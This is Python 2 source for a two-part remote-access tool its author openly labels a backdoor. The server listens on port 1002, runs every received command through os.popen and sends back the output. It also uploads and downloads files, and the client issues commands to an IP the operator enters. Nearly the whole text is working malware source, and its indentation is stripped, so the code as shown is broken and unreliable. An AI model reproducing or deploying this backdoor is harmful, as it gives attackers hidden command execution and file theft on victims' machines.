#Backdoor Client
#Version: 0.2.0
#
#when give is invoked it will copy the targets byte data
# it creats a new file named after the target; if you use
# give on a file you already have it will append to it doubling the size
# tests show no effect on this appending double.
#######

import os, socket

def ishere(f):
x = 0
for i in os.listdir(os.getcwd()):
if i == f:
x += 1
return x


def take(fle):
if fle[:13] == '=-=-start-=-=' or fle[-11:] == '=-=-fin-=-=':
return True
else: return False


def give(file):
try:
f = open(file,'rb')
f = f.read()
x = '=-=-start-=-='+f+'=-=-fin-=-='
return x
except IOError:
return "No such file"



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((raw_input("I.P.:: "),1002)) #Change localhost to your servers IP

print"""
[-]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-[-]
l l
= =
l .@@@@@@@@@@. @@@@@@@@@ .@@@@@@@. @@@ @@@ @@@@@@@. l
= @@@@@@@@@@@@@@@@ @@@@@@@@@ @@@@@@@@@ @@@ @@@ @@ @@ =
l !! @@@@ !! @!! @@ ! @@! @@@ @! @ l
= ! @!@! ! @@! @! !@! @!@ @@@@@@@. =
l !@!! !!@@@!@ !! @!@!@!@! @@@@@@@@ l
= !!!! !@!!:@@ @! !!!@!!!! !: @@ =
l !@:! :!! !: !!: !!! !@ :! l
= !:!: @!: !! ! :!: !:! :: :!: @@ =
l :!:! ::! ::!:!:::!: :!! !: ::@:!! @@ l
= ::!: !::!!!::l :!::!::!: ::! : !!:: =
l :: ::: !: :: :: l
= : : ! ! ! =
l l
= =
[-]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-[-]

Type commands to view functions.
syntax: Tech B>>commands
"""


while 1:


cmnd = raw_input("Tech B>>")
if cmnd == "commands":

print """
chdri
Changes working drive.
syntax: Tech B>>chdri D:
--------------------------------------------------------------------------------
=-=-take-=-=
copies the selected file to the directory
that contains the client program

syntax:
Tech B>>=-=-take-=-=file_to_copy.exe
this function is not limited to the extention due to copying of the byte code
--------------------------------------------------------------------------------
=-=-give-=-=
copies the specifid file to the server side current directory
The server will ask what file.

syntax:
Tech B>>=-=-give-=-=
What file to give me? file.exe
"""


elif cmnd == '':
print "Enter a command..."
continue

s.send(cmnd)
data = s.recv(10000000)


if data == "What file to give me?":
print data
fi = raw_input("File: ")
if ishere(fi) != 0:
s.send(fi)
chk = s.recv(1000000)
if chk == 'ready %s' % fi:
print 'ready %s' % fi
mf = give(fi)
s.send(mf)
print 'done'
s.send('done')
else:
print "No such file..."
s.send("sorry")


elif take(data) == True:
data = data[13:]
while 1:
try:
if data[-11:] != '=-=-fin-=-=':
nfile = open(cmnd[12:],"ab")
nfile.write(data)
data = s.recv(10000000)
else:
nfile.write(data[:-11])
nfile.close()
except ValueError: break


else: print data




#Backdoor Server
#Version 0.4.1
#######

import socket, os
import os.path


def cd(st):
try:
st.index("cd ")
return True
except ValueError: return False


def fil(cmnd):
try:
cmnd.index('=-=-take-=-=')
return True
except ValueError: return False


def take(file):
file = file[12:]
try:
f = open(file,'rb')
f = f.read()
x = '=-=-start-=-='+f+'=-=-fin-=-='
return x
except IOError:
return "No such file"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
s.bind(('',1002))


while 1:
try:
s.listen(5)
conn, addr = s.accept()


while 1:
data = conn.recv(1000000)


if data == "cd..":
x = os.path.split(os.getcwd())
os.chdir(x[0])
conn.send(x[0])


#doesn't work with full paths ie "cd C:\Windows\Config\Sytem32\"
elif cd(data) == True:
try:
os.chdir(os.getcwd()+"\\%s" % data[3:])
conn.send(os.getcwd())
except WindowsError: conn.send("No Such dir..")


elif fil(data) == True:
fle = take(data)
conn.send(fle)


elif data == "=-=-give-=-=":
conn.send("What file to give me?")
fn = conn.recv(1000000)
if fn == "sorry":
continue
nFile = open(fn,"ab")
conn.send('ready %s' % fn)
buff = conn.recv(1000000)
nFile.write(buff[13:])


while buff:
try:
buff = conn.recv(1000000)
if buff == 'done':
nFile.close()
nFile.write(buff)
except ValueError: break


else:
c = os.popen(data)
c = c.read()
if c == '':
conn.send("Not Readble")
conn.send(c)

except socket.error:
pass